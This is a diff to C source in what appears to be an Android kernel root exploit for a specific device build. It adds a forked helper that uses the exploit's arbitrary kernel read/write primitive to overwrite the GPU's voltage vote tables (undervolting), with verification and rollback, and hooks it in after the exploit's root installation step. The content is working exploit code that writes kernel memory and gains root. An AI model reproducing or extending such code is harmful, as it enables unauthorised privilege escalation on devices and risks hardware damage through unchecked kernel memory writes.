@@ -1,0 +1,309 @@
+diff --git a/exploit/src/targets/m3q-BP4A.251205.006/pipe.c b/exploit/src/targets/m3q-BP4A.251205.006/pipe.c
+--- a/exploit/src/targets/m3q-BP4A.251205.006/pipe.c
++++ b/exploit/src/targets/m3q-BP4A.251205.006/pipe.c
+@@ -9,6 +9,258 @@ static int m3q_attr_fd[2] = {-1, -1};
+ static uintptr_t m3q_attr_object[2];
+ static int m3q_attr_list_restored;
+ static int m3q_attr_w1_dirty;
++
++#define M3Q_GPU_UV_REQUEST_PATH "/data/local/tmp/m3q_uv_request"
++#define M3Q_GPU_UV_READY_TIMEOUT_SEC 300
++#define M3Q_GPU_UV_COMMIT_TIMEOUT_SEC 30
++#define M3Q_ADRENO_TO_GMU_OFF 0x720UL
++#define M3Q_GMU_GPU_LEVEL_NUM_OFF 0x508UL
++#define M3Q_GMU_GMU_LEVEL_NUM_OFF 0x50cUL
++#define M3Q_GMU_GX_VOTES_OFF 0x510UL
++#define M3Q_GPU_LEVEL_COUNT 20U
++#define M3Q_GMU_LEVEL_COUNT 5U
++
++struct m3q_gpu_opp {
++  uint32_t vote;
++  uint32_t dep_vote;
++  uint32_t freq;
++};
++
++_Static_assert(sizeof(struct m3q_gpu_opp) == 12,
++               "AZG3 GPU DCVS entry layout drift");
++
++static const struct m3q_gpu_opp m3q_gpu_stock[M3Q_GPU_LEVEL_COUNT] = {
++    {0x00000000U, 0xffffffffU, 0U},
++    {0x00320201U, 0xffffc2ffU, 160000U},
++    {0x00330302U, 0xffffc2ffU, 191000U},
++    {0x00340303U, 0xffffc2ffU, 222000U},
++    {0x00360404U, 0xffffc2ffU, 282000U},
++    {0x00380405U, 0xffffc2ffU, 342000U},
++    {0x003c0506U, 0xffffc3ffU, 382000U},
++    {0x00400607U, 0xffffc3ffU, 422000U},
++    {0x004c0708U, 0xffffc4ffU, 461000U},
++    {0x00500709U, 0xffffc4ffU, 500000U},
++    {0x0080080aU, 0xffffc4ffU, 578000U},
++    {0x0090090bU, 0xffffc5ffU, 646000U},
++    {0x00c00a0cU, 0xffffc5ffU, 726000U},
++    {0x00e00b0dU, 0xffffc6ffU, 826000U},
++    {0x01000c0eU, 0xffffc6ffU, 902000U},
++    {0x01800d0fU, 0xffffc8ffU, 1000000U},
++    {0x01a00e10U, 0xffffc9ffU, 1050000U},
++    {0x01b00f11U, 0xffffcaffU, 1100000U},
++    {0x01c01012U, 0xffffcaffU, 1200000U},
++    {0x01c41113U, 0xffffcbffU, 1300000U},
++};
++
++static void m3q_gpu_uv_set_name(const char *name) {
++  (void)prctl(PR_SET_NAME, name);
++}
++
++static int m3q_gpu_uv_wait_signal(const sigset_t *set, int timeout_sec) {
++  struct timespec timeout = {.tv_sec = timeout_sec, .tv_nsec = 0};
++  for (;;) {
++    errno = 0;
++    int sig = sigtimedwait(set, NULL, &timeout);
++    if (sig >= 0 || errno != EINTR) {
++      return sig;
++    }
++  }
++}
++
++static int m3q_gpu_uv_read_request(uintptr_t *adreno) {
++  char text[64];
++  int fd = open(M3Q_GPU_UV_REQUEST_PATH, O_RDONLY | O_CLOEXEC);
++  if (fd < 0) {
++    return 0;
++  }
++
++  ssize_t got = read(fd, text, sizeof(text) - 1);
++  close(fd);
++  unlink(M3Q_GPU_UV_REQUEST_PATH);
++  if (got <= 0 || got >= (ssize_t)sizeof(text)) {
++    return 0;
++  }
++  text[got] = 0;
++
++  char *end = NULL;
++  errno = 0;
++  unsigned long long parsed = strtoull(text, &end, 0);
++  if (errno || end == text) {
++    return 0;
++  }
++  while (*end == ' ' || *end == '\t' || *end == '\r' || *end == '\n') {
++    end++;
++  }
++  if (*end || !is_kernel_ptr((uintptr_t)parsed)) {
++    return 0;
++  }
++
++  *adreno = (uintptr_t)parsed;
++  return 1;
++}
++
++static int m3q_gpu_uv_addresses(uintptr_t adreno, uintptr_t *gpu_levels,
++                                uintptr_t *gmu_levels, uintptr_t *gx) {
++  if (!is_kernel_ptr(adreno) || adreno < M3Q_ADRENO_TO_GMU_OFF) {
++    return 0;
++  }
++
++  uintptr_t gmu = adreno - M3Q_ADRENO_TO_GMU_OFF;
++  *gpu_levels = gmu + M3Q_GMU_GPU_LEVEL_NUM_OFF;
++  *gmu_levels = gmu + M3Q_GMU_GMU_LEVEL_NUM_OFF;
++  *gx = gmu + M3Q_GMU_GX_VOTES_OFF;
++  return is_kernel_ptr(*gpu_levels) && is_kernel_ptr(*gmu_levels) &&
++         is_kernel_ptr(*gx);
++}
++
++static int m3q_gpu_uv_verify(uintptr_t gx, int patched) {
++  struct m3q_gpu_opp actual[M3Q_GPU_LEVEL_COUNT];
++  struct m3q_gpu_opp expected[M3Q_GPU_LEVEL_COUNT];
++  memcpy(expected, m3q_gpu_stock, sizeof(expected));
++
++  if (patched) {
++    for (size_t i = 2; i < M3Q_GPU_LEVEL_COUNT; i++) {
++      expected[i].vote = m3q_gpu_stock[i - 1].vote;
++      expected[i].dep_vote = m3q_gpu_stock[i - 1].dep_vote;
++    }
++  }
++
++  return m3q_attr_kernel_read_data(gx, actual, sizeof(actual)) &&
++         !memcmp(actual, expected, sizeof(actual));
++}
++
++static int m3q_gpu_uv_restore_stock(uintptr_t gx) {
++  for (size_t i = 2; i < M3Q_GPU_LEVEL_COUNT; i++) {
++    uint32_t pair[2] = {
++        m3q_gpu_stock[i].vote,
++        m3q_gpu_stock[i].dep_vote,
++    };
++    uintptr_t target = gx + i * sizeof(struct m3q_gpu_opp);
++    if (!m3q_attr_kernel_write_data(target, pair, sizeof(pair))) {
++      return 0;
++    }
++  }
++  return m3q_gpu_uv_verify(gx, 0);
++}
++
++/*
++ * Return 1 when the requested 18-state patch is fully verified, 0 when the
++ * request is refused or cleanly rolled back, and -1 when rollback cannot be
++ * proven and a real reboot is required.
++ */
++static int m3q_gpu_uv_apply(uintptr_t adreno, uintptr_t *gx_out) {
++  uintptr_t gpu_levels_addr = 0;
++  uintptr_t gmu_levels_addr = 0;
++  uintptr_t gx = 0;
++  uint32_t gpu_levels = 0;
++  uint32_t gmu_levels = 0;
++
++  if (!m3q_gpu_uv_addresses(adreno, &gpu_levels_addr, &gmu_levels_addr, &gx) ||
++      !m3q_attr_kernel_read_data(gpu_levels_addr, &gpu_levels,
++                                 sizeof(gpu_levels)) ||
++      !m3q_attr_kernel_read_data(gmu_levels_addr, &gmu_levels,
++                                 sizeof(gmu_levels)) ||
++      gpu_levels != M3Q_GPU_LEVEL_COUNT || gmu_levels != M3Q_GMU_LEVEL_COUNT ||
++      !m3q_gpu_uv_verify(gx, 0)) {
++    return 0;
++  }
++
++  for (size_t i = 2; i < M3Q_GPU_LEVEL_COUNT; i++) {
++    uint32_t pair[2] = {
++        m3q_gpu_stock[i - 1].vote,
++        m3q_gpu_stock[i - 1].dep_vote,
++    };
++    uintptr_t target = gx + i * sizeof(struct m3q_gpu_opp);
++    if (!m3q_attr_kernel_write_data(target, pair, sizeof(pair))) {
++      return m3q_gpu_uv_restore_stock(gx) ? 0 : -1;
++    }
++  }
++
++  if (!m3q_gpu_uv_verify(gx, 1)) {
++    return m3q_gpu_uv_restore_stock(gx) ? 0 : -1;
++  }
++
++  *gx_out = gx;
++  return 1;
++}
++
++static void m3q_gpu_uv_hold_dirty(void) {
++  m3q_gpu_uv_set_name("m3q_uv_dirty");
++  for (;;) {
++    sleep(60);
++  }
++}
++
++static void m3q_gpu_uv_hold_state(const char *name) {
++  m3q_gpu_uv_set_name(name);
++  sleep(2);
++}
++
++static void m3q_gpu_uv_keeper_child(int ready_fd) {
++  sigset_t set;
++  sigemptyset(&set);
++  sigaddset(&set, SIGUSR1);
++  sigaddset(&set, SIGUSR2);
++  sigaddset(&set, SIGTERM);
++  if (sigprocmask(SIG_BLOCK, &set, NULL) != 0) {
++    _exit(120);
++  }
++
++  unlink(M3Q_GPU_UV_REQUEST_PATH);
++  m3q_gpu_uv_set_name("m3q_uv_ready");
++  const uint8_t marker = 1;
++  if (write(ready_fd, &marker, sizeof(marker)) != (ssize_t)sizeof(marker)) {
++    _exit(121);
++  }
++  close(ready_fd);
++
++  /* Do not retain the runner's stdio pipes while the one-shot window is open. */
++  close(STDIN_FILENO);
++  close(STDOUT_FILENO);
++  close(STDERR_FILENO);
++
++  int sig = m3q_gpu_uv_wait_signal(&set, M3Q_GPU_UV_READY_TIMEOUT_SEC);
++  if (sig != SIGUSR1) {
++    _exit(0);
++  }
++
++  uintptr_t adreno = 0;
++  uintptr_t gx = 0;
++  if (!m3q_gpu_uv_read_request(&adreno)) {
++    m3q_gpu_uv_hold_state("m3q_uv_stock");
++    _exit(2);
++  }
++
++  int applied = m3q_gpu_uv_apply(adreno, &gx);
++  if (applied < 0) {
++    m3q_gpu_uv_hold_dirty();
++  }
++  if (!applied) {
++    m3q_gpu_uv_hold_state("m3q_uv_stock");
++    _exit(3);
++  }
++
++  m3q_gpu_uv_set_name("m3q_uv_patched");
++  sig = m3q_gpu_uv_wait_signal(&set, M3Q_GPU_UV_COMMIT_TIMEOUT_SEC);
++
++  if (sig == SIGUSR2 && m3q_gpu_uv_verify(gx, 1)) {
++    m3q_gpu_uv_hold_state("m3q_uv_commit");
++    _exit(0);
++  }
++
++  if (!m3q_gpu_uv_restore_stock(gx)) {
++    m3q_gpu_uv_hold_dirty();
++  }
++  m3q_gpu_uv_hold_state("m3q_uv_stock");
++  _exit(4);
++}
++
++static int m3q_start_gpu_uv_keeper(void) {
++  if (!m3q_attr_carrier_ready || m3q_attr_fd[0] < 0 || m3q_attr_fd[1] < 0) {
++    return 0;
++  }
++
++  int ready[2];
++  if (pipe(ready) != 0) {
++    return 0;
++  }
++
++  pid_t pid = fork();
++  if (pid < 0) {
++    close(ready[0]);
++    close(ready[1]);
++    return 0;
++  }
++  if (pid == 0) {
++    close(ready[0]);
++    m3q_gpu_uv_keeper_child(ready[1]);
++    _exit(127);
++  }
++
++  close(ready[1]);
++  uint8_t marker = 0;
++  ssize_t got;
++  do {
++    got = read(ready[0], &marker, sizeof(marker));
++  } while (got < 0 && errno == EINTR);
++  close(ready[0]);
++  if (got != (ssize_t)sizeof(marker) || marker != 1) {
++    kill(pid, SIGTERM);
++    return 0;
++  }
++
++  pr_success("m3q-gpu-uv-keeper-ready pid=%d timeout=%ds\n", pid,
++             M3Q_GPU_UV_READY_TIMEOUT_SEC);
++  return 1;
++}
+ 
+ static int m3q_allocate_filp_drain(void);
+ static int m3q_allocate_filp_reclaim(void);
+@@ -678,12 +930,16 @@ static int m3q_run_attr_carrier_stage(void) {
+   if (proof_ok && root_requested) {
+     root_ok = install_android_root(m3q_attr_fd[1]);
+     if (!root_ok && m3q_root_requires_reboot) {
+       return m3q_hold_dirty_attr_route(
+           "temporary root queue/state did not reach the socket oracle");
+     }
++    if (root_ok && !m3q_start_gpu_uv_keeper()) {
++      pr_warning("m3q GPU UV keeper unavailable; root remains usable but "
++                 "manual UV is disabled for this boot\n");
++    }
+   }
+   result = proof_ok && m3q_attr_list_restored &&
+            (!root_requested ||
+             (root_ok && root_child_done && root_uid_after == 0 &&
